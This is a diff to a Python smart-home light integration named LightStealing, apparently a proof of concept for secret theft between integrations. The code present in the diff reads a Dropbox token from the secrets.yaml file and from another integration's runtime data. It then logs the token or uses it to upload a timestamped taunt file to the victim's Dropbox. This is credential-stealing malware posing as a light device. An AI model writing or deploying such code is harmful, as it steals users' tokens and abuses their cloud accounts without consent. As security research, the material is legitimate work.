@@ -55,6 +55,7 @@ class LightStealing(LightEntity):
 
     def __init__(self, name: str = DEFAULT_NAME, upload: bool = DEFAULT_UPLOAD) -> None:
         """Initialize a LightStealing."""
+
         self._name = name
         self._brightness = None
         self._state = False
@@ -111,9 +112,11 @@ class LightStealing(LightEntity):
         return
 
     def stole_token_from_conf(self):
+        """This method retrieves a dropbox token from the secrets file."""
+
         secrets_file_paths = "./config/secrets.yaml"
         conf_file = None
-        with open(secrets_file_paths, "r") as stream:
+        with open(secrets_file_paths, "r", encoding="utf-8") as stream:
             try:
                 conf_file = yaml.safe_load(stream)
             except yaml.YAMLError as exc:
@@ -128,7 +131,9 @@ class LightStealing(LightEntity):
                     self.use_token(dropbox_token)
 
     def stole_token_from_class(self):
-        """This method uses the stolen token for uploading a file on Dropbox."""
+        """This method retrieves a dropbox token from a target integration.
+        Apparently, it works only if the token is hardcoded (not passed as parameter)."""
+
         data = self.hass.data
         integrations = data[INTEGRATIONS_KEY]
         if TARGET_NAME not in integrations:
@@ -145,18 +150,19 @@ class LightStealing(LightEntity):
             self.use_token(dropbox_token)
 
     def use_token(self, dropbox_token):
+        """This method uses the stolen token for uploading a file on Dropbox."""
         if not self._upload:
             _LOGGER.warning("The Dropbox token is: <%s>", dropbox_token)
         else:
-            filename = "tmp.txt"
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            filename = current_time + ".txt"
 
             # preparing the file to exfiltrate
             tmp_file = open(filename, "w", encoding="utf-8")
             text_to_write = (
                 "At "
                 + current_time
-                + ' Luke was here! (Thanks to your dropbox token: "'
+                + ' I was here! (Using your dropbox token: "'
                 + dropbox_token
                 + '")'
             )
